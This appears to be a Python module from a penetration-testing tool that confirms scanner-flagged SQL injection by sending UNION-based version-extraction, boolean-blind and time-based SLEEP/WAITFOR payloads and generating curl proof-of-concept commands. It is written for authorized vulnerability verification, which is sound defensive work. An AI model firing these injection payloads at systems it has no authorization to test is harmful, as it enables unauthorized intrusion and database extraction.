"""
GlitchForge Pentester - SQL Injection Validator
Proves SQL injection vulnerabilities through controlled exploitation.
All techniques are read-only and non-destructive.
"""

import re
import time
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, parse_qs

from app.core.scanner.base_scanner import VulnerabilityResult
from .base_validator import BaseValidator
from .data_models import (
    PentestResult, PentestEvidence, HttpExchange,
    VerificationStatus, ExploitTechnique
)


class SQLiValidator(BaseValidator):
    """
    SQL Injection exploitation validator.

    Techniques (in order of attempted escalation):
    1. UNION-based extraction: Extract database version/name from error messages
    2. Boolean blind: Use conditional responses to confirm injection
    3. Time-based blind: Use SLEEP/WAITFOR to confirm injection via timing

    All techniques are read-only (SELECT only, no writes).
    """

    # Patterns to extract DB version from UNION SELECT results
    VERSION_MARKERS = [
        # MySQL
        re.compile(r'(\d+\.\d+\.\d+[-\w]*MariaDB[-\w]*)', re.IGNORECASE),
        re.compile(r'(\d+\.\d+\.\d+[-\w]*)', re.IGNORECASE),
        # Generic version strings injected by our payloads
        re.compile(r'GFMARKER_START(.+?)GFMARKER_END', re.DOTALL),
    ]

    # Database error patterns (reused from scanner for context)
    ERROR_PATTERNS = [
        re.compile(r"SQL syntax.*MySQL", re.IGNORECASE),
        re.compile(r"Warning.*mysql_", re.IGNORECASE),
        re.compile(r"PostgreSQL.*ERROR", re.IGNORECASE),
        re.compile(r"ORA-\d{4,5}", re.IGNORECASE),
        re.compile(r"SQLite.*error", re.IGNORECASE),
        re.compile(r"unclosed quotation mark", re.IGNORECASE),
        re.compile(r"syntax error.*SQL", re.IGNORECASE),
    ]

    def _parse_url(self, vuln: VulnerabilityResult) -> Tuple[str, Dict[str, str]]:
        """Parse vulnerability URL into base URL and existing params"""
        parsed = urlparse(vuln.url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        existing_params = {}
        if parsed.query:
            for key, values in parse_qs(parsed.query).items():
                existing_params[key] = values[0] if values else ''
        return base_url, existing_params

    def validate(self, vuln: VulnerabilityResult) -> PentestResult:
        """Attempt to validate SQL injection through escalating techniques"""
        start_time = time.time()
        attempts = 0

        base_url, existing_params = self._parse_url(vuln)

        # Technique 1: UNION-based extraction
        result = self._try_union_extraction(vuln, base_url, existing_params)
        attempts += 1
        if result and result.verification_status == VerificationStatus.CONFIRMED:
            result.duration_seconds = time.time() - start_time
            result.attempts = attempts
            return result

        # Technique 2: Boolean blind verification
        result = self._try_boolean_blind(vuln, base_url, existing_params)
        attempts += 1
        if result and result.verification_status == VerificationStatus.CONFIRMED:
            result.duration_seconds = time.time() - start_time
            result.attempts = attempts
            return result

        # Technique 3: Time-based blind
        result = self._try_time_blind(vuln, base_url, existing_params)
        attempts += 1
        if result and result.verification_status == VerificationStatus.CONFIRMED:
            result.duration_seconds = time.time() - start_time
            result.attempts = attempts
            return result

        # None confirmed
        return PentestResult(
            vulnerability_url=vuln.url,
            vulnerability_parameter=vuln.parameter,
            vulnerability_type=vuln.vuln_type.value,
            verification_status=(
                VerificationStatus.LIKELY if vuln.confidence >= 0.85
                else VerificationStatus.UNVERIFIED
            ),
            confidence=vuln.confidence * 0.7,
            attempts=attempts,
            duration_seconds=time.time() - start_time
        )

    def _try_union_extraction(
        self,
        vuln: VulnerabilityResult,
        base_url: str,
        existing_params: Dict[str, str]
    ) -> Optional[PentestResult]:
        """
        Attempt UNION-based data extraction.

        Step 1: Determine column count via ORDER BY
        Step 2: UNION SELECT with version()/@@version
        Step 3: Capture extracted data as evidence
        """
        self.logger.debug(f"Trying UNION extraction on {vuln.parameter}")

        # Step 1: Find column count using ORDER BY
        column_count = self._find_column_count(vuln, base_url, existing_params)
        if column_count is None:
            self.logger.debug("Could not determine column count")
            return None

        self.logger.debug(f"Column count: {column_count}")

        # Step 2: Try UNION SELECT with version markers
        # Build UNION payloads for different databases
        union_columns = ', '.join(
            ["CONCAT('GFMARKER_START',version(),'GFMARKER_END')" if i == 0
             else 'NULL'
             for i in range(column_count)]
        )
        union_payload_mysql = f"1' UNION SELECT {union_columns}-- -"

        # Also try @@version for MySQL/MSSQL
        union_columns_v2 = ', '.join(
            ["CONCAT('GFMARKER_START',@@version,'GFMARKER_END')" if i == 0
             else 'NULL'
             for i in range(column_count)]
        )
        union_payload_generic = f"1' UNION SELECT {union_columns_v2}-- -"

        # Also try sqlite_version() for SQLite
        union_columns_sqlite = ', '.join(
            ["'GFMARKER_START'||sqlite_version()||'GFMARKER_END'" if i == 0
             else 'NULL'
             for i in range(column_count)]
        )
        union_payload_sqlite = f"1' UNION SELECT {union_columns_sqlite}-- -"

        for payload in [union_payload_mysql, union_payload_generic, union_payload_sqlite]:
            if not self.is_safe_payload(payload):
                continue

            test_params = existing_params.copy()
            test_params[vuln.parameter] = payload

            response = self.make_request(base_url, params=test_params)
            if not response:
                continue

            # Check for our marker in the response
            marker_match = re.search(
                r'GFMARKER_START(.+?)GFMARKER_END',
                response.text, re.DOTALL
            )

            if marker_match:
                extracted_version = marker_match.group(1).strip()
                self.logger.info(f"UNION extraction successful: {extracted_version}")

                exchange = self.capture_exchange(response)
                curl_cmd = self.generate_curl(base_url, params=test_params)

                evidence = PentestEvidence(
                    technique=ExploitTechnique.SQLI_UNION,
                    http_exchanges=[exchange],
                    poc_command=curl_cmd,
                    extracted_data=[
                        f"Database version: {extracted_version}"
                    ],
                    impact_description=(
                        f"SQL Injection confirmed via UNION-based extraction. "
                        f"Successfully extracted database version: {extracted_version}. "
                        f"An attacker could use this technique to extract any data "
                        f"from the database including user credentials, personal data, "
                        f"and application secrets."
                    ),
                    reproduction_steps=[
                        f"Navigate to {vuln.url}",
                        f"Inject the following payload into the '{vuln.parameter}' parameter: {payload}",
                        f"Observe the database version '{extracted_version}' in the response",
                        "This confirms arbitrary data can be extracted from the database"
                    ]
                )

                return PentestResult(
                    vulnerability_url=vuln.url,
                    vulnerability_parameter=vuln.parameter,
                    vulnerability_type=vuln.vuln_type.value,
                    verification_status=VerificationStatus.CONFIRMED,
                    confidence=0.99,
                    evidence=evidence
                )

        return None

    def _find_column_count(
        self,
        vuln: VulnerabilityResult,
        base_url: str,
        existing_params: Dict[str, str]
    ) -> Optional[int]:
        """Determine column count using ORDER BY technique"""
        for num_cols in range(1, 15):
            payload = f"1' ORDER BY {num_cols}-- -"
            if not self.is_safe_payload(payload):
                continue

            test_params = existing_params.copy()
            test_params[vuln.parameter] = payload

            response = self.make_request(base_url, params=test_params)
            if not response:
                continue

            # If ORDER BY N causes an error, the table has N-1 columns
            has_error = any(p.search(response.text) for p in self.ERROR_PATTERNS)

            if has_error and num_cols > 1:
                return num_cols - 1

        # Fallback: try common column counts directly with UNION SELECT NULL,...
        for num_cols in [1, 2, 3, 5]:
            nulls = ', '.join(['NULL'] * num_cols)
            payload = f"1' UNION SELECT {nulls}-- -"
            if not self.is_safe_payload(payload):
                continue

            test_params = existing_params.copy()
            test_params[vuln.parameter] = payload

            response = self.make_request(base_url, params=test_params)
            if not response:
                continue

            has_error = any(p.search(response.text) for p in self.ERROR_PATTERNS)
            if not has_error:
                return num_cols

        return None

    def _try_boolean_blind(
        self,
        vuln: VulnerabilityResult,
        base_url: str,
        existing_params: Dict[str, str]
    ) -> Optional[PentestResult]:
        """
        Boolean blind: send 1' AND 1=1-- vs 1' AND 1=2--
        Compare response content. If consistently different, injection is confirmed.
        """
        self.logger.debug(f"Trying boolean blind on {vuln.parameter}")

        # True condition
        true_payload = "1' AND 1=1-- -"
        true_params = existing_params.copy()
        true_params[vuln.parameter] = true_payload
        true_resp = self.make_request(base_url, params=true_params)

        # False condition
        false_payload = "1' AND 1=2-- -"
        false_params = existing_params.copy()
        false_params[vuln.parameter] = false_payload
        false_resp = self.make_request(base_url, params=false_params)

        if not true_resp or not false_resp:
            return None

        # Compare response sizes
        true_len = len(true_resp.text)
        false_len = len(false_resp.text)
        size_diff = abs(true_len - false_len)

        # Also compare content hashes (ignoring minor dynamic content)
        true_text = true_resp.text.strip()
        false_text = false_resp.text.strip()
        content_differs = true_text != false_text

        # Repeat to confirm consistency (reduces false positives)
        if content_differs and size_diff > 50:
            # Second round to confirm
            true_resp2 = self.make_request(base_url, params=true_params)
            false_resp2 = self.make_request(base_url, params=false_params)

            if true_resp2 and false_resp2:
                true_len2 = len(true_resp2.text)
                false_len2 = len(false_resp2.text)

                # Check consistency: true responses should be similar, false should be similar
                true_consistent = abs(true_len - true_len2) < 100
                false_consistent = abs(false_len - false_len2) < 100
                still_different = abs(true_len2 - false_len2) > 50

                if true_consistent and false_consistent and still_different:
                    self.logger.info(
                        f"Boolean blind confirmed: true={true_len}b, false={false_len}b, "
                        f"diff={size_diff}b (consistent across 2 rounds)"
                    )

                    true_exchange = self.capture_exchange(true_resp)
                    false_exchange = self.capture_exchange(false_resp)
                    curl_true = self.generate_curl(base_url, params=true_params)
                    curl_false = self.generate_curl(base_url, params=false_params)

                    evidence = PentestEvidence(
                        technique=ExploitTechnique.SQLI_BOOLEAN_BLIND,
                        http_exchanges=[true_exchange, false_exchange],
                        poc_command=f"# True condition (returns data):\n{curl_true}\n\n# False condition (no data):\n{curl_false}",
                        extracted_data=[
                            f"True condition response: {true_len} bytes",
                            f"False condition response: {false_len} bytes",
                            f"Consistent difference: {size_diff} bytes"
                        ],
                        impact_description=(
                            f"SQL Injection confirmed via boolean-based blind technique. "
                            f"The application returns different responses for true (AND 1=1) "
                            f"vs false (AND 1=2) conditions, proving SQL injection. "
                            f"An attacker could extract the entire database contents "
                            f"character by character using this technique."
                        ),
                        reproduction_steps=[
                            f"Send request with '{vuln.parameter}' = {true_payload} (true condition)",
                            f"Send request with '{vuln.parameter}' = {false_payload} (false condition)",
                            f"Observe different response sizes: {true_len} bytes vs {false_len} bytes",
                            "The consistent difference proves SQL is being executed server-side"
                        ]
                    )

                    return PentestResult(
                        vulnerability_url=vuln.url,
                        vulnerability_parameter=vuln.parameter,
                        vulnerability_type=vuln.vuln_type.value,
                        verification_status=VerificationStatus.CONFIRMED,
                        confidence=0.95,
                        evidence=evidence
                    )

        return None

    def _try_time_blind(
        self,
        vuln: VulnerabilityResult,
        base_url: str,
        existing_params: Dict[str, str]
    ) -> Optional[PentestResult]:
        """
        Time-based blind: send SLEEP(3) payload, measure response time.
        If response takes >= 2.5 seconds longer than baseline, confirmed.
        """
        self.logger.debug(f"Trying time-based blind on {vuln.parameter}")

        # Get baseline timing
        baseline_params = existing_params.copy()
        baseline_params[vuln.parameter] = "1"
        baseline_start = time.time()
        baseline_resp = self.make_request(base_url, params=baseline_params)
        baseline_time = time.time() - baseline_start

        if not baseline_resp:
            return None

        # Time-based payloads for different databases
        sleep_payloads = [
            ("1' AND SLEEP(3)-- -", "MySQL"),
            ("1'; WAITFOR DELAY '0:0:3'-- -", "MSSQL"),
            ("1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)-- -", "MySQL subquery"),
        ]

        for payload, db_type in sleep_payloads:
            if not self.is_safe_payload(payload):
                continue

            test_params = existing_params.copy()
            test_params[vuln.parameter] = payload

            inject_start = time.time()
            inject_resp = self.make_request(base_url, params=test_params)
            inject_time = time.time() - inject_start

            if not inject_resp:
                continue

            time_diff = inject_time - baseline_time

            self.logger.debug(
                f"Time blind ({db_type}): baseline={baseline_time:.1f}s, "
                f"injected={inject_time:.1f}s, diff={time_diff:.1f}s"
            )

            # If response took at least 2.5s longer, SLEEP worked
            if time_diff >= 2.5:
                self.logger.info(
                    f"Time-based blind confirmed: {time_diff:.1f}s delay ({db_type})"
                )

                exchange = self.capture_exchange(inject_resp)
                curl_cmd = self.generate_curl(base_url, params=test_params)

                evidence = PentestEvidence(
                    technique=ExploitTechnique.SQLI_TIME_BLIND,
                    http_exchanges=[exchange],
                    poc_command=curl_cmd,
                    extracted_data=[
                        f"Baseline response time: {baseline_time:.2f}s",
                        f"Injected response time: {inject_time:.2f}s",
                        f"Time difference: {time_diff:.2f}s (SLEEP(3) executed)",
                        f"Database type: {db_type}"
                    ],
                    impact_description=(
                        f"SQL Injection confirmed via time-based blind technique. "
                        f"The SLEEP(3) command caused a {time_diff:.1f}s delay, "
                        f"proving server-side SQL execution. An attacker could use "
                        f"this to extract data character by character via timing analysis, "
                        f"or potentially execute system commands depending on DB privileges."
                    ),
                    reproduction_steps=[
                        f"Send a baseline request with '{vuln.parameter}' = 1 and measure response time ({baseline_time:.2f}s)",
                        f"Send request with '{vuln.parameter}' = {payload}",
                        f"Observe response takes {inject_time:.2f}s ({time_diff:.1f}s longer than baseline)",
                        "The delay confirms the SLEEP() command was executed by the database"
                    ]
                )

                return PentestResult(
                    vulnerability_url=vuln.url,
                    vulnerability_parameter=vuln.parameter,
                    vulnerability_type=vuln.vuln_type.value,
                    verification_status=VerificationStatus.CONFIRMED,
                    confidence=0.97,
                    evidence=evidence
                )

        return None
